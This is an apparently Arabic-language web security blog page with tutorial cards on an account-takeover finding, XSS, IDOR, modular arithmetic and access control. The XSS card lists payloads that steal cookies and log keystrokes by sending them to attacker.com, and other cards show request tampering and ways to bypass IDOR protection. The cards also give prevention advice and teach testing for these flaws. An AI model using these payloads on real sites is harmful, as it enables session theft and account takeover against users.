<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>XVx70ox - Security Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }
   
    html, body {
      margin: 0;
      padding: 0;
      overflow-x: hidden;
      width: 100%;
    }
   
    body {
      font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #13181b;
      color: #aefcf7;
      min-height: 100vh;
    }
   
    .matrix-bg {
      position: fixed;
      z-index: 0;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      pointer-events: none;
    }
   
    .nav {
      background: #15181aee;
      padding: clamp(0.8em, 3vw, 1.2em) clamp(1em, 4vw, 2em);
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: 0 2px 8px #19ffaa2a;
      position: relative;
      z-index: 2;
      width: 100%;
    }
   
    .logo {
      font-size: clamp(1.3em, 5vw, 2em);
      font-weight: bold;
      letter-spacing: 2px;
      color: #21ffe7;
      text-shadow: 0 0 8px #21ffe756;
      word-break: keep-all;
    }
   
    .main {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 80vh;
      position: relative;
      z-index: 1;
      width: 100%;
      padding: 1em clamp(0.5em, 2vw, 1em);
    }
   
    .card {
      background: #181c1f;
      border-radius: 18px;
      box-shadow: 0 0 22px 2px #16ffe346, 0 0 80px 4px #21ffe710;
      margin: 2em auto; /* تم التعديل هنا: زيادة المسافة بين البطاقات */
      padding: clamp(1.2em, 4vw, 2em);
      max-width: 600px;
      width: 100%;
      text-align: right;
      border: 1.5px solid #18f0c9a1;
      cursor: pointer;
      transition: box-shadow 0.2s;
      word-wrap: break-word;
      overflow-wrap: break-word;
      hyphens: auto;
    }
   
    .card:hover {
      box-shadow: 0 0 38px 6px #21ffe7aa, 0 0 80px 8px #16ffe376;
    }
   
    .card h2 {
      color: #21ffe7;
      font-size: clamp(1.3em, 4vw, 1.7em);
      margin-top: 0;
      margin-bottom: 0.6em;
      text-shadow: 0 0 8px #21ffe745;
      text-align: right;
      word-wrap: break-word;
    }
   
    .card h3 {
      color: #21ffe7;
      font-size: clamp(1em, 3.5vw, 1.3em);
      margin: 0.6em 0;
      text-align: right;
      word-wrap: break-word;
    }
   
    .card p {
      color: #cdfcf3;
      font-size: clamp(0.95em, 2.5vw, 1.13em);
      margin: 0.6em 0;
      text-align: right;
      word-wrap: break-word;
      overflow-wrap: break-word;
    }
   
    .card .date {
      color: #aaa;
      font-size: clamp(0.85em, 2vw, 0.93em);
      margin-top: 1em;
      font-style: italic;
      letter-spacing: 1px;
      text-align: left;
    }
   
    .explain {
      background: #202627ee;
      border-radius: 0 0 14px 14px;
      margin-top: 1em;
      padding: clamp(0.8em, 3vw, 1em);
      color: #d1fff5;
      font-size: clamp(0.9em, 2.3vw, 1.07em);
      display: none;
      animation: fadein 0.7s;
      text-align: left;
      overflow-x: hidden;
      width: 100%;
      word-wrap: break-word;
      overflow-wrap: break-word;
    }
   
    .explain img {
      max-width: 100%;
      height: auto;
      display: block;
      margin: 1em 0;
      border-radius: 10px;
    }
   
    .explain pre {
      background: #22272b;
      color: #16ffe7;
      padding: 0.6em;
      border-radius: 7px;
      font-family: 'Fira Mono', 'Consolas', monospace;
      overflow-x: auto;
      white-space: pre-wrap;
      word-wrap: break-word;
      max-width: 100%;
      font-size: clamp(0.75em, 2vw, 0.9em);
      margin: 1em 0;
    }
   
    .explain code {
      background: #22272b;
      color: #16ffe7;
      padding: 0.2em 0.4em;
      border-radius: 4px;
      font-family: 'Fira Mono', 'Consolas', monospace;
      word-break: break-all;
      font-size: clamp(0.8em, 2vw, 0.95em);
    }
   
    .explain ul, .explain ol {
      padding-right: 1.5em;
      padding-left: 0;
      margin: 0.8em 0;
    }
   
    .explain li {
      margin: 0.5em 0;
      word-wrap: break-word;
    }
   
    .explain h2, .explain h3, .explain h4 {
      color: #21ffe7;
      margin: 1.2em 0 0.6em 0;
      word-wrap: break-word;
      font-size: clamp(1em, 3vw, 1.3em);
    }
   
    .explain strong, .explain b {
      color: #21ffe7;
    }

    /* تحسين المسافات الداخلية */
    .card h2, .card h3, .card p, .card pre, .card ul, .card ol {
      margin-bottom: 1em;
    }

    .card .explain > * {
      margin-bottom: 1.2em;
    }

    .card .explain > *:last-child {
      margin-bottom: 0;
    }
   
    @keyframes fadein {
      from { opacity: 0; transform: translateY(-18px);}
      to { opacity: 1; transform: translateY(0);}
    }
   
    /* Mobile First Approach */
    @media (max-width: 480px) {
      .nav {
        padding: 0.8em 1em;
      }
     
      .logo {
        font-size: 1.3em;
        letter-spacing: 1px;
      }
     
      .main {
        padding: 0.5em;
      }
     
      .card {
        margin: 1.5em auto; /* مسافة أقل على الموبايل لتوفير المساحة */
        padding: 1.2em;
        border-radius: 12px;
      }
     
      .explain pre {
        font-size: 0.75em;
        padding: 0.5em;
      }
    }
   
    @media (min-width: 481px) and (max-width: 768px) {
      .card {
        max-width: 95%;
      }
    }
   
    @media (min-width: 769px) {
      .card {
        max-width: 700px;
      }
    }
   
    @media (min-width: 1024px) {
      .card {
        max-width: 800px;
      }
    }
  </style>
</head>
<body>
  <canvas class="matrix-bg"></canvas>
  <div class="nav">
    <div class="logo">XVx70ox</div>
    <div>Menu</div>
  </div>
  <div class="main">
    <!-- بطاقة WebAssembly -->
    <div class="card" onclick="toggleExplain(this)">
      <h2>اختراق WebAssembly</h2>
      <h3>اللهم لك الحمد حمداً لا ينفذ أوله ولا ينقطع آخره يا رب لك الحمد</h3>
      <p>Account Takeover And Staying Logged In Forever After Password Reset</p>
      <div class="date">October 2025</div>
      <div class="explain">
        <strong>بسم الله الرحمن الرحيم , اللهم لك الحمد مالك المنه الفضل علي عباده الفقراء...</strong>
        <br>(وَقُل رَّبِّ زِدْنِي عِلْمًا) (طه: 114)<br>
        نَحمدك على عطاءك مرة وعلى منعك ألف مرة فأنت الخير وما مَنعت خيرًا.<br>
        I'm Youssef Mohammed Elsyed —<br>
        a security researcher and bug hunter <br>
        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*6F3bND-tT6I5H3juwUut4A.png">
        <br>
        <b>TL;DR</b><br>
        During an authorized test I discovered the system allows account creation without email verification and issues access_token and refresh_token at signup. If the real account owner later signs in with Google or changes/resets their password, the old tokens the attacker obtained remain valid — enabling persistent access. All sensitive data in this post is redacted.<br>
        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*1skD0kr7og0LBrT6KqCBOA.png">
        <br>
        <b>Scenario:</b><br>
        I can register any email on the platform because the system does not require email verification during signup.<br>
        If the legitimate account owner later signs in using Google, this does not prevent the attacker — who created the unverified account — from maintaining control over the same account.<br>
        When the real account owner uses the Reset Password flow and changes their password, the attacker still retains the refresh_token obtained during signup. This token is not revoked or expired as a result of the password change.<br>
        The attacker can, at any later time, use the stored token to generate new access tokens and regain full access to the account — allowing actions such as viewing PII or changing account settings.<br>
        <b>Impact:</b><br>
        Critical Account Takeover, High Data Exposure, High Fraud & Abuse, Medium Operational impact,<br>
        <b>Technical reasons:</b><br>
        1. Refresh tokens issued to unverified accounts (email_verified: false).<br>
        2. No mechanism to revoke/invalidate tokens on password reset/change.<br>
        3. No refresh-token rotation or reuse detection.<br>
        4. Lack of email canonicalization/normalization.<br>
        <b>PoC:</b><br>
        Steps: Register with alias, obtain token, victim resets password, reuse refresh_token to gain access.<br>
        <b>Result:</b> Access to account after password reset.
      </div>
    </div>

    <!-- بطاقة XSS -->
   <div class="card" onclick="toggleExplain(this)">
      <h2>Cross-Site Scripting (XSS)</h2>
      <p>...بسم الله الرحمن الرحيم...<br>
(وَقُل رَّبِّ زِدْنِي عِلْمًا) <br>
نَحمدك على عطاءك مرة وعلى منعك ألف مرة فأنت الخير وما مَنعت خيرًا</p>
      <p>XSS is one of the most common and dangerous web vulnerabilities.</p>
      <div class="date">October 2025</div>
      <div class="explain">
        <h3>1. تعريف ثغرة XSS</h3>
        <p>
          <strong>Cross-Site Scripting (XSS)</strong><br>

           هي ثغرة أمنية تسمح للمهاجم بحقن كود<br>
           <code>JavaScript</code> <br>
           ضار في صفحات الويب التي يراها المستخدمون الآخرون.
        </p>
        <p>عندما يزور الضحية الصفحة، يتم تنفيذ السكربت في متصفحه بنفس صلاحيات الموقع الأصلي، مما يتيح:</p>
        <ul>
          <li>سرقة الكوكيز / التوكنات</li>
          <li>تشويه الموقع (Defacement)</li>
          <li>تسجيل ضغطات المفاتيح (Keylogging)</li>
          <li>التصيد (Phishing)</li>
          <li>إعادة توجيه المستخدم</li>
          <li>تنفيذ أوامر نيابة عن المستخدم</li>
        </ul>
        
        <p><b>XSS<br>
        OWASP Top 10 ولا تزال  منتشرة جدًا من ضمن</b></p>

        <h3>2. أنواع ثغرة XSS</h3>
        <table style="width:100%; border-collapse: collapse; margin: 1em 0;">
          <tr style="background: #22272b;">
            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">النوع</th>
            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">الوصف</th>
            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">الاستمرارية</th>
            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">مثال</th>
          </tr>
          <tr>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;">Reflected XSS</td>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;">السكربت في الرابط ويُعكس في الرد</td>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;">غير مستمر</td>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
          </tr>
          <tr>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;">Stored XSS</td>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;">يُخزن في قاعدة البيانات ويُعرض للجميع</td>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;">مستمر</td>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;">تعليق: <code>&lt;script&gt;alert('hacked')&lt;/script&gt;</code></td>
          </tr>
          <tr>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;">DOM-Based XSS</td>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;">في الـ JavaScript من جانب العميل</td>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;">غير مستمر</td>
            <td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>innerHTML = location.hash</code></td>
          </tr>
        </table>

        <h3>3. كيف تعمل الثغرة؟</h3>
        <ol>
          <li>المهاجم يجد نقطة إدخال (نموذج، رابط، تعليق...)</li>
          <li>يحقن <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
          <li>التطبيق لا يُنظف أو يُهرب الإدخال</li>
          <li>السكربت يُعرض ويُنفذ في متصفح الضحية</li>
          <li>المهاجم يتحكم</li>
        </ol>

        <h3>4. أمثلة عملية</h3>
        <h4>مثال 1: Reflected XSS</h4>
        <pre>&lt;?php
$query = $_GET['q'];
echo "Search results for: " . $query;
?&gt;</pre>
        <p>رابط الهجوم:</p>
        <pre>http://vulnerable.com/search.php?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>

        <h4>مثال 2: Stored XSS</h4>
        <pre>&lt;?php
$comment = $_POST['comment'];
file_put_contents('comments.txt', $comment . "\n", FILE_APPEND);
?&gt;</pre>
        <p>المهاجم يرسل:</p>
        <pre>&lt;script&gt;
  document.location = 'http://attacker.com/steal.php?c=' + document.cookie;
&lt;/script&gt;</pre>

        <h4>مثال 3: DOM-Based XSS</h4>
        <pre>&lt;script&gt;
  const name = location.hash.substring(1);
  document.getElementById('greeting').innerHTML = 'Hello, ' + name;
&lt;/script&gt;</pre>
        <p>رابط الهجوم:</p>
        <pre>#&lt;img src=x onerror=alert('DOM-XSS')&gt;</pre>

        <h3>5. Payloads شائعة</h3>
        <table style="width:100%; border-collapse: collapse; margin: 1em 0;">
          <tr style="background: #22272b;">
            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">الغرض</th>
            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">الـ Payload</th>
          </tr>
          <tr><td style="padding: 0.5em; border: 1px solid #18f0c9;">اختبار</td><td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
          <tr><td style="padding: 0.5em; border: 1px solid #18f0c9;">سرقة الكوكيز</td><td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>new Image().src='http://attacker.com/log?c='+document.cookie;</code></td></tr>
          <tr><td style="padding: 0.5em; border: 1px solid #18f0c9;">Keylogger</td><td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>document.onkeypress=e=&gt;fetch('http://attacker.com/log?k='+e.key)</code></td></tr>
          <tr><td style="padding: 0.5em; border: 1px solid #18f0c9;">تجاوز الفلاتر</td><td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>&lt;img src=x onerror=alert(1)&gt;</code></td></tr>
        </table>

        <h3>6. طرق الحماية</h3>
        <ul>
          <li><strong>Output Encoding</strong>: <code>htmlspecialchars()</code> في PHP</li>
          <li><strong>CSP</strong>: <code>&lt;meta http-equiv="Content-Security-Policy" content="script-src 'self'"&gt;</code></li>
          <li><strong>HttpOnly Cookies</strong>: لا يمكن الوصول لها عبر JS</li>
          <li><strong>استخدم Frameworks آمنة</strong>: Laravel, React, Django</li>
          <li><strong>DOMPurify</strong> لتنظيف الـ HTML</li>
        </ul>

        <h3>7. أدوات الاختبار</h3>
        <ul>
          <li>Burp Suite</li>
          <li>XSStrike</li>
          <li>XSS Hunter</li>
          <li>PayloadsAllTheThings</li>
        </ul>
      </div>
    </div>
    

    <!-- بطاقة IDOR -->
    <div class="card" onclick="toggleExplain(this)">
      <h2>Insecure Direct Object References (IDOR)</h2>
      <p>...بسم الله الرحمن الرحيم...<br>
(وَقُل رَّبِّ زِدْنِي عِلْمًا) <br>
نَحمدك على عطاءك مرة وعلى منعك ألف مرة فأنت الخير وما مَنعت خيرًا.</p>
      <p>IDORs happen when users can access resources they do not own by directly referencing object IDs in requests.</p>
      <div class="date">October 2025</div>
      <div class="explain">
        <h2>Content Table</h2>
        <h3>IDORs - نظرة عامة</h3>
        تحدث ثغرات <b>Insecure Direct Object References (IDORs)</b> عندما يتمكن المستخدمون من الوصول إلى موارد لا تخصهم عن طريق الإشارة مباشرةً إلى مُعرِّف الكائن (<code>object ID</code>) أو رقم الكائن أو اسم الملف.
        <h3>آلية عمل الثغرة (Mechanisms)</h3>
        على سبيل المثال:<br>
        لنفترض أن موقع example.com يتيح لك رؤية رسائلك عبر الرابط:
        <pre>https://example.com/messages?user_id=1234</pre>
        <b>ماذا يحدث إذا قمنا بتغيير <code>user_id</code> إلى رقم آخر؟</b> يمكننا رؤية رسائل مستخدم آخر دون أي إذن.
        <h3>تأثير ثغرات IDOR (Impact)</h3>
        يمكن أن يكون لثغرات IDOR تأثير كبير مثل الوصول إلى ملفات وموارد خاصة أو تعديل بيانات مستخدمين آخرين.
        <h4>مثال 1: كشف البيانات</h4>
        <pre>messages = load_messages(request.user_id)
display_messages(messages)</pre>
        إذا لم يتحقق التطبيق من أن <code>request.user_id</code> هو المُستخدم الحالي، فسيقوم بعرض رسائل أي مُعرِّف يتم تمريره.
        <h4>مثال 2: تغيير كلمة المرور</h4>
        يرسل المستخدم طلب <code>POST</code> لتغيير كلمة مروره. إذا لم يتحقق التطبيق من صلاحية المُرسِل:
        <pre>POST /change_password
(POST request body)
user_id=1234&new_password=12345</pre>
        يمكن للمُهاجم إرسال مُعرِّف مستخدم آخر وتغيير كلمة مروره.<br>
        <h3>Hunting for IDORs (البحث عن الثغرات)</h3>
        <ol>
        <li>الخطوة 1: إنشاء حسابين. إذا كان هناك صلاحيات مختلفة، أنشئ حسابين لكل مستوى.</li>
        <li>الخطوة 2: اكتشاف الميزات.
         <ul>
            <li>قراءة الرسائل:
              <pre>https://example.com/messages?user_id=1236</pre>
            </li>
            <li>قراءة الملفات:
              <pre>https://example.com/uploads?file=user1236-01.jpeg</pre>
            </li>
            <li>حذف رسالة مستخدم:
              <pre>POST /delete_message
(POST request body)
message_id=user1236-0111</pre>
            </li>
         </ul>
        </li>
        <li>الخطوة 3 و 4: التقاط الطلبات وتغيير المعرّفات.</li>
        </ol>
        <h3>Bypassing IDOR Protection (تجاوز الحماية)</h3>
        <ul>
          <li>المُعرِّفات المرمّزة والمسربة:
            <pre>https://example.com/messages?user_id=MTIzNg
(Base64url لـ 1236)</pre>
          </li>
          <li>تقديم مُعرِّف غير مطلوب:
            <pre>GET /api_v1/messages?user_id=ANOTHER_USERS_ID</pre>
          </li>
          <li>IDORs العمياء:
            <pre>POST /get_receipt
(POST request body)
receipt_id=2983</pre>
          </li>
          <li>تغيير طريقة الطلب:
            <pre>DELETE example.com/uploads/user1236-01.jpeg
GET /get_receipt?receipt_id=2983.json</pre>
          </li>
        </ul>
        <h3>منع ثغرات IDORs (Prevention)</h3>
        <ol>
          <li>التحقق من الصلاحيات (Access Control): التأكد من أن معرف الجلسة يمتلك فعلاً المورد المطلوب.</li>
          <li>استخدام معرفات غير قابلة للتخمين:
            <pre>https://example.com/messages?user_key=6MT9EalV9F7r9pns0mK1eDAEW</pre>
          </li>
        </ol>
      </div>
    </div>

    <!-- بطاقة Cryptography -->
    <div class="card" onclick="toggleExplain(this)">
      <h2>Cryptography</h2>
      <p>...بسم الله الرحمن الرحيم...<br>
(وَقُل رَّبِّ زِدْنِي عِلْمًا) <br>
نَحمدك على عطاءك مرة وعلى منعك ألف مرة فأنت الخير وما مَنعت خيرًا.</p>
      <p>لو انت بتذاكر تشفير خلي بالك من شابتر 1</p>
      <div class="date">October 2025</div>
      <div class="explain">
        <h2>Content Table</h2>
        <h3>Cryptography- نظرة عامة</h3>
        Modular Arithmetic لأنها من أهم قواعد الرياضيات اللي الكريبتوجرافي كله قايم عليها.
        <h3>(Modular Arithmetic)</h3>
        <pre>دي بالظبط زي فكرة الساعة Clock Arithmetic، زي مثلاً لما بتوصل للساعة 12، الرقم اللي بعدها بيكون 1 مش 13
وده بيخلي في معادلات شكلها غريب شوية زي
6 + 9 = 3
و
2 − 3 = 11</pre>
        <pre>الكلام ده باين غريب، بس هو صح في حساب الساعة،
لأن مثلًا الساعة 11 هي قبل الساعة 2 بـ 3 ساعات.
يعني احنا فعليًا بنحسب 2 − 3 = −1 وبعدين بنضيف 12 للنتيجة.
وبالمثل، 9 ساعات بعد الساعة 6 يعني 6 + 9 − 12 = 3، يعني الساعة 3.</pre>
        <pre>النظرية اللي مبنية على الفكرة دي في الرياضيات اسمها نظرية التطابقات (Theory of Congruences)،
وهي من الأدوات القوية جدًا في علم الأعداد.
خلينا نفترض إن m ≥ 1 عدد صحيح
ساعتها بنقول إن العددين a و b متطابقين مود m يعني لو الفرق بينهم a − b يقبل القسمة على m
ونكتبها بالشكل ده:
a ≡ b (mod m)
يعني a و b متطابقين مود m.
والعدد m ده بنسميه الموديلوس (modulus).
مثال الساعة اللي فوق ممكن نكتبها كده باستخدام m = 12 :
6 + 9 = 15 ≡ 3 (mod 12)
2 − 3 = −1 ≡ 11 (mod 12)
مثال:
17 ≡ 7 (mod 5)
لأن 5 بتقسِم 10 = 17 − 7
لكن
19 ≢ 6 (mod 11)
لأن 11 مش بتقسِم 13 = 19 − 6.</pre>
<br>
<pre>
لاحظ إن الأعداد اللي بتحقق
a ≡ 0 (mod m)
هي الأعداد اللي قابلة للقسمة على m، يعني مضاعفات m.
السبب اللي بيخلي صيغة التطابق دي مفيدة جدًا
هو إنها بتتصرف زي المساواة العادية
خلينا نفترض إن m ≥ 1 عدد صحيح:
لو
a₁ ≡ a₂ (mod m) و b₁ ≡ b₂ (mod m)
يبقى:
a₁ ± b₁ ≡ a₂ ± b₂ (mod m)
و
a₁ ⋅ b₁ ≡ a₂ ⋅ b₂ (mod m)
ولو a عدد صحيح، يبقى:
a ⋅ b ≡ 1 (mod m)
لعدد صحيح b إذا وفقط إذا كان gcd(a, m) = 1
كمان، لو
a ⋅ b₁ ≡ a ⋅ b₂ ≡ 1 (mod m)
يبقى
b₁ ≡ b₂ (mod m)
وبنسمي b المعكوس (multiplicative inverse) لـ a مود m
طب يلا نفترض إن gcd(a, m) = 1.
من نظرية إقليدس نقدر نلاقي عددين صحيحين u و v بحيث:
a·u + m·v = 1
وده معناه إن a·u − 1 = −m·v قابل للقسمة على m، فبالتالي
a·u ≡ 1 (mod m)
يعني نقدر نختار b = u.
أما العكس، لو عندنا
a·b ≡ 1 (mod m)
ده معناه إن a·b − 1 = c·m لعدد صحيح c،
وده يعني إن gcd(a, m) بتقسِم 1، فبالتالي gcd(a, m) = 1.
وده يثبت إن
 a
 ليه معكوس مود m
 إذا وفقط إذا كان gcd(a, m) = 1.
كمان نقدر نثبت إن المعكوس ده وحيد مود m
بتقول إن لو gcd(a, m) = 1 يبقى فيه معكوس b لـ a مود m
وده معناه إن الكسر a⁻¹ = 1/a
ليه معنى في عالم الأعداد الصحيحة موديلو m، بحيث يكون
a⁻¹ (mod m)
هو العدد b اللي بيحقق:
a·b ≡ 1 (mod m)
خد m = 5 و a = 2:
gcd(2, 5) = 1
يبقى فيه معكوس لـ 2 مود 5، واللي هو 3 لأن
2·3 ≡ 1 (mod 5)
فبالتالي
2⁻¹ ≡ 3 (mod 5)
وبرضو gcd(4, 15) = 1، يعني 4 ليها معكوس مود 15، وبالفعل
4·4 ≡ 1 (mod 15)
يعني 4 هي معكوس نفسها.
نقدر نتعامل مع كسر a/d مود m طالما المقام d أولي بالنسبة لـ m.
مثلاً نحسب:
5/7 (mod 11)
نلاحظ إن:
7·8 ≡ 1 (mod 11)
يبقى 7⁻¹ ≡ 8 (mod 11)
إذن:
5/7 = 5·7⁻¹ ≡ 5·8 ≡ 40 ≡ 7 (mod 11)
في الأمثلة
 اللي فاتت كان سهل نلاقي
 المعكوسات بالتجربة، لكن لما m يكون كبير الموضوع بيبقى أصعب.
إحنا استخدمنا خوارزمية إقليدس الموسعة
 (Extended Euclidean Algorithm)
 علشان نثبت وجود المعكوس
الطريقة دي بتحتاج عدد صغير من الخطوات
(حوالي 2log₂(m) + 2) علشان تحسب a⁻¹ (mod m).
لما نقسم a على m، بيبقى عندنا:
a = m·q + r
مع 0 ≤ r < m
وده معناه إن a ≡ r (mod m)
فعلشان نشتغل على الأعداد موديلو m، كفاية نستخدم الأعداد:
0 ≤ r < m
وده بيؤدي للتعريف الجي
Z/mZ = {0, 1, 2, ..., m−1}
وده بنسميه حلقة الأعداد الصحيحة مود
 m (Ring of integers mod m)
نجمع ونضرب عناصرها كأعداد عادية،
 وبعدين نأخد باقي القسمة على m
لو درست نظرية الحلقات (Ring Theory)، هتعرف إن
 Z/mZ
هي الحلقة الناتجة من قسمة Z على المثالي mZ،
وإن الأعداد 0, 1, ...,
 m−1 هي الممثلين للفئات المتطابقة (Congruence Classes).
من النتيجة اللي فوق:
العدد a له معكوس مود m إذا وفقط إذا
 gcd(a, m) = 1.
الأعداد اللي ليها معكوسات بنسميها الوحدات
(Units)، ومجموعتها بنرمز لها كده:
(Z/mZ)* = {a ∈ Z/mZ : gcd(a, m) = 1}
ودي بنسميها مجموعة الوحدات موديلو
 m (Group of Units modulo m)
مجموعة الوحدات موديلو 24 هي:
(Z/24Z)* = {1, 5, 7, 11, 13, 17, 19, 23}
ومجموعة الوحدات مود 7 هي:
(Z/7Z)* = {1, 2, 3, 4, 5, 6}
لأن كل الأعداد من 1 لـ 6 أولية مع 7
</pre>
        بس كدا اتمنى تكون استفدت #JOO
      </div>
    </div>

    <!-- بطاقة Access Control Vulnerability -->
    <div class="card" onclick="toggleExplain(this)">
      <h2>Access Control Vulnerability</h2>
      <p>...بسم الله الرحمن الرحيم...<br>
(وَقُل رَّبِّ زِدْنِي عِلْمًا) <br>
نَحمدك على عطاءك مرة وعلى منعك ألف مرة فأنت الخير وما مَنعت خيرًا.</p>
      <p>باختصار يا هندسة، دي ثغرة بتحصل لما الموقع أو السيستم مش بيحدد كويس مين يقدر يعمل إيه (تحكم ضعيف في الصلاحيات)، يعني المستخدم العادي ممكن يعمل Actions أو يشوف Data مش المفروض يشوفها، زي إنه ياكسس لوحة تحكم الأدمن أو يعدل على اي اكونت تاني.</p>
      <div class="date">November 2025</div>
      <div class="explain">
        <h3>Scenario 1: IDOR Example (Insecure Direct Object Reference)</h3>
        <p>
          بتحصل لما تلاقي باراميتر في الـ URL أو الريكوست بيتحدد على أساسه إنت بتشوف بيانات مين. لو مفيش تشيك على صلاحياتك، ممكن تعدل الـ id وتاخد بيانات يوزر تاني، زي كده:
        </p>
        <pre>GET /user/profile?id=1001</pre>
        <p>لو انت عايز تشوف بيانات يوزر تاني وببساطة غيرت الرقم في اللينك كده:</p>
        <pre>GET /user/profile?id=1002</pre>
        <p>ولو السيرفر رجعلك بيانات، يبقى عندنا ثغرة IDOR.</p>
       
        <br>
       
        <h3>Scenario 2: Accessing Admin Panel</h3>
        <p>سيبك بقا من الـ UI! ساعات الأدمن بانل مش باينة لليوزر العادي، بس لو دخلت اليو أر إل direct كده:</p>
        <pre>GET /admin/dashboard</pre>
        <p>ولو فتحت معاك كـ مستخدم عادي، يبقى كده الـ Access Control بايظ واللي يدخل يبوظ الدنيا.</p>
       
        <br>
       
        <h3>Scenario 3: API Parameter Manipulation</h3>
        <p>لنفرض فيه Endpoint زي:</p>
        <pre>POST /api/change_role?user_id=88&role=admin</pre>
        <p>لو أي حد يقدر يعدل role المستخدم بدون ما السيستم يشوف هل هو فعلاً معاه الصلاحيات دي ولا لا ويقبل الريكوست، كده أي يوزر ممكن يخلي نفسه admin ويتحكم في السيستم كله.</p>
       
        <br>
       
        <h3>خطوات اكتشاف واستغلال الثغرة بنفسك</h3>
        <ul>
          <li>جرب تغير أي id أو باراميتر في الـ Request وشوف لو هتاخد Response فيها بيانات مش بتاعتك.</li>
          <li>جرب تـ Access صفحات أدمن أو داتا مش ليك، يا من الواجهة، يا إما تكتب الـ URL على طول (force browsing).</li>
          <li>جرب تستخدم أدوات زي Burp Suite أو OWASP ZAP تعدل الريكوستات وتراقب الريسبونس.</li>
          <li>ارصد لو الـ session بتاعتك ممكن يتحول أو تتبدل بواحدة تانية (Priv Escalation).</li>
        </ul>
       
        <br>
       
        <h3>إزاي تمنع Access Control Vulnerabilities في الكود</h3>
        <ul>
          <li>دايمًا شيّك على صلاحيات اليوزر في كل Request على الـ Server Side (ما تعتمدش على الـ UI بس).</li>
          <li>خلي الـ Access الافتراضي على الموارد الحساسة يكون Deny وبعدين اسمح بالصلاحيات المطلوبة بس.</li>
          <li>اربط كل الوظايف المهمة أو الموارد الحساسة بجلسة اليوزر مش مجرد ID.</li>
          <li>إعمل Logging لأي ريكوست مش طبيعي وتابع محاولات اختراق الصلاحيات.</li>
        </ul>
       
        <br>
       
        <h3>كود بايثون توضيحي لمشكلة IDOR</h3>
        <p><strong>لو عندك كود زيه كده:</strong></p>
        <pre>@app.route('/profile')
def profile():
    user_id = request.args.get('id')
    user = User.query.filter_by(id=user_id).first()
    return jsonify(user.to_dict())</pre>
       
        <p><strong style="color:#ff6b6b;">كده أي حد يغير قيمة الـ id في URL ياخد أي بيانات!</strong></p>
       
        <p><strong>الحل:</strong></p>
        <p>لازم تشيك على مين اللي طالب البيانات:</p>
        <pre>@app.route('/profile')
def profile():
    if current_user.id == int(request.args.get('id')) or current_user.is_admin:
        user_id = request.args.get('id')
        user = User.query.filter_by(id=user_id).first()
        return jsonify(user.to_dict())
    else:
        abort(403)</pre>
       
        <p><strong style="color:#51cf66;">كده محدش يقدر ياخد بيانات غيره إلا لو معاه صلاحية الأدمن</strong></p>
      </div>
    </div>

    <!-- بطاقة Broken Access Control -->
    <div class="card" onclick="toggleExplain(this)">
      <h2>Broken Access Control</h2>
      <p>...بسم الله الرحمن الرحيم...<br>
(وَقُل رَّبِّ زِدْنِي عِلْمًا) <br>
نَحمدك على عطاءك مرة وعلى منعك ألف مرة فأنت الخير وما مَنعت خيرًا.</p>
      <p>ثغرة خطيرة بتحصل لما النظام يفشل في تطبيق قواعد الصلاحيات، والمستخدم العادي يقدر يشوف أو يعدل بيانات مش من حقه!</p>
      <div class="date">November 2025</div>
      <div class="explain">
        <h3>تعريف (Definition)</h3>
        <p>
          <strong>"Broken Access Control"</strong> هي ثغرة بتحصل لما النظام أو الموقع يسمح لأي مستخدم يوصل أو يعمل حاجات مش مسموح له فيها. يعني لما الموقع يفشل في تطبيق قواعد الصلاحيات، المستخدم العادي ممكن يشوف بيانات خاصة بغيره أو يعدل حاجات مش من حقه.
        </p>
       
        <br>
       
        <h3>أهم المصطلحات الإنجليزية اللي لازم تعرفها</h3>
        <ul>
          <li><strong>Access Control:</strong> التحكم في الوصول</li>
          <li><strong>Authorization:</strong> التفويض (تحديد الصلاحيات)</li>
          <li><strong>Authentication:</strong> التوثيق (تأكيد الهوية)</li>
          <li><strong>Privilege Escalation:</strong> تصعيد الصلاحيات</li>
          <li><strong>IDOR (Insecure Direct Object Reference):</strong> ضعف التحقق عند الوصول للأشياء بشكل مباشر</li>
        </ul>
       
        <br>
       
        <h3>كيف تظهر الثغرة؟ (How does it happen?)</h3>
        <ul>
          <li>النظام بيعتمد على أكواد أو منطق غير كافي لحماية الوظائف والصفحات الحساسة.</li>
          <li>بيكون فيه ثغرة منطقية مش مشكلة input validation، يعني المبرمج نسي يشوف هل اليوزر ليه حق يعمل action ولا لأ.</li>
          <li>التلاعب بالـ request أو بالـ URL يخليك توصل لحاجات مش بتاعتك.</li>
        </ul>
       
        <p><strong>مثال عملي:</strong></p>
        <pre>GET /profile?id=10</pre>
